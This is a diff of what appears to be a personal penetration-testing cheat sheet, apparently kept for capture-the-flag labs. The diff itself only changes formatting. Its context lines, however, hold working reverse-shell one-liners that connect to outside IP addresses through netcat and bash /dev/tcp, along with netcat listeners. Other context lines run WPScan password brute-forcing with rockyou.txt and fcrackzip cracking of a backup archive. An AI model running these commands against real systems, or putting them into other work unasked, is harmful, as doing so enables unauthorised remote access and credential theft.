@@ -1,5 +1,5 @@
 Linux
------------------------------------------------------
+-------------------------------------------------------------------------
 echo "deb http://http.kali.org/kali kali-rolling main contrib non-free" | sudo tee /etc/apt/sources.list
 apt-key adv --keyserver keyserver.ubuntu.com --recv-keys ED444FF07D8D0BF6
 apt-get -y update && apt-get -y -f upgrade && apt-get -y full-upgrade && apt-get -y -f  install kali-linux-everything
@@ -48,6 +48,7 @@ nc -e /bin/sh 147.182.232.224 444
 bash -i >& /dev/tcp/147.182.232.224/444 0>&1
 nc -nlvp 1234
 exec bash -c 'bash -i >& /dev/tcp/10.10.14.93/1234 0>&1'
+
 nc -nv 10.129.41.200 7777 - Client Request
 nc -lvnp 7777 - Server Listener
 
@@ -139,7 +140,7 @@ WPScan
 wpscan --url $URL/wordpress/ -U /usr/share/wordlists/ -P /usr/share/wordlists/rockyou.txt
 wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
 
-Zip
+ZIP
 fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
 
 Decode Linux
